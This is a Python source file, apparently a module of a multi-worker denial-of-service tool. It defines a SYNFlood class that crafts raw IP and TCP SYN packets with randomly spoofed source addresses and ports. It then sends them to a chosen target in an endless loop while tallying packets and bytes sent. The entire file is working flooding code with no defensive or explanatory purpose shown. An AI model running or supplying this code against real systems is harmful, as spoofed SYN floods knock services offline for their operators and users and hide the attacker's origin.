import socket
import random
import time
import struct

class SYNFlood:
    def __init__(self, args, config, stats, running, worker_id):
        self.target = args.target
        self.port = args.port
        self.config = config.get('syn', {})
        self.stats = stats
        self.running = running
        self.worker_id = worker_id
        
    def _random_ip(self):
        return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def _checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i+1] if i+1 < len(msg) else 0)
            s += w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s
    
    def _build_syn_packet(self, src_ip, dst_ip, src_port, dst_port):
        # IP Header
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 20
        ip_id = random.randint(0, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        ip_header = struct.pack('!BBHHHBBH4s4s',
            ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
            ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        
        # TCP Header
        tcp_src = src_port
        tcp_dst = dst_port
        tcp_seq = random.randint(0, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_fin = 0
        tcp_syn = 1
        tcp_rst = 0
        tcp_psh = 0
        tcp_ack = 0
        tcp_urg = 0
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        
        tcp_offset_res = (tcp_doff << 4) + 0
        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH',
            tcp_src, tcp_dst, tcp_seq, tcp_ack_seq,
            tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
        
        # Pseudo header for checksum
        source_address = socket.inet_aton(src_ip)
        dest_address = socket.inet_aton(dst_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH',
            source_address, dest_address, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_check = self._checksum(psh)
        tcp_header = struct.pack('!HHLLBBH',
            tcp_src, tcp_dst, tcp_seq, tcp_ack_seq,
            tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
        
        packet = ip_header + tcp_header
        return packet
    
    def attack(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print(f"[!] Worker {self.worker_id}: Raw sockets require root privileges")
            return
        
        while self.running.value:
            try:
                src_ip = self._random_ip()
                src_port = random.randint(1024, 65535)
                packet = self._build_syn_packet(src_ip, self.target, src_port, self.port)
                sock.sendto(packet, (self.target, self.port))
                
                with self.stats['sent'].get_lock():
                    self.stats['sent'].value += 1
                    self.stats['bps'].value += len(packet)
                    
            except Exception:
                with self.stats['failed'].get_lock():
                    self.stats['failed'].value += 1
                time.sleep(0.001)
